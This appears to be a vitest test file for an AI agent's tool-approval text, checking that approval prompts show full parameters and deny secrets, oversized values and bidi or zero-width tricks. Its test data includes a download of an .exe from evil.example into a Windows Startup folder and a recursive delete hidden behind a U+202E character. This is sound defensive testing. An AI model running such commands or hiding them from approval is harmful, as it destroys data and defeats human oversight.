import { describe, expect, it } from 'vitest';
import { formatApproval, unapprovableOperation } from '../src/approval-text.js';
import type { ToolCall } from '../src/permissions.js';

const call = (tool: string, args: Record<string, unknown>): ToolCall => ({
  tool,
  args,
  actor: 'agent',
});

describe('la pregunta de aprobación enseña lo que se va a ejecutar', () => {
  it('una herramienta genérica muestra todos sus parámetros (URL y ruta de una descarga)', () => {
    const r = formatApproval(
      call('download', { url: 'https://evil.example/x.exe', path: 'C:/Users/n/Startup/x.exe' }),
      'not on the allow list',
    );
    expect(r.complete).toBe(true);
    expect(r.question).toContain('https://evil.example/x.exe');
    expect(r.question).toContain('C:/Users/n/Startup/x.exe');
  });

  it('dos llamadas distintas a la misma herramienta no dan la misma pregunta', () => {
    const a = formatApproval(call('servicio', { action: 'instalar', nombre: 'a' }), 'x');
    const b = formatApproval(call('servicio', { action: 'instalar', nombre: 'b' }), 'x');
    expect(a.question).not.toBe(b.question);
  });

  it('el navegador enseña el texto que va a escribir, no solo el campo', () => {
    const r = formatApproval(
      call('browser', {
        action: 'fill',
        selector: '#iban',
        text: 'ES91 2100 0418 4502 0005 1332',
        _target: 'input IBAN',
      }),
      'touches money or credentials',
    );
    expect(r.complete).toBe(true);
    expect(r.question).toContain('ES91 2100 0418 4502 0005 1332');
  });

  it('un parámetro con forma de secreto deniega en vez de enseñarse enmascarado', () => {
    const r = formatApproval(call('servicio', { env: 'API_KEY=sk-abcdefghijklmnop' }), 'x');
    expect(r.complete).toBe(false);
  });

  it('un parámetro que no cabe entero deniega (sin recortar)', () => {
    const r = formatApproval(
      call('download', { url: `https://a.example/${'x'.repeat(4000)}` }),
      'x',
    );
    expect(r.complete).toBe(false);
    expect(r.question).not.toContain('xxxxxxxxxx');
  });

  it('un comando con un carácter bidi (U+202E) no se puede aprobar', () => {
    const cmd = 'echo hola \u202E; Remove-Item -Recurse C:/datos';
    expect(formatApproval(call('shell', { command: cmd }), 'x').complete).toBe(false);
    expect(unapprovableOperation(call('shell', { command: cmd }))).not.toBeNull();
  });

  it('un texto de computer con caracteres de ancho cero no se puede aprobar', () => {
    expect(
      formatApproval(call('computer', { action: 'type', text: 'hola\u200Bmundo' }), 'x').complete,
    ).toBe(false);
  });

  it('las herramientas libres con texto largo siguen siendo aprobables (sin regresión)', () => {
    expect(
      unapprovableOperation(call('memory', { action: 'save', text: 'x'.repeat(5000) })),
    ).toBeNull();
    expect(
      unapprovableOperation(call('delegate', { task: 'token=abc123 '.repeat(10) })),
    ).toBeNull();
    expect(
      unapprovableOperation(
        call('browser', {
          action: 'fill',
          selector: '#c',
          text: 'y'.repeat(5000),
          _target: 'textarea',
        }),
      ),
    ).toBeNull();
  });

  it('sin parámetros la pregunta no cambia', () => {
    expect(formatApproval(call('fetch', {}), 'x').question).toBe('¿Permito fetch?\nx');
  });
});
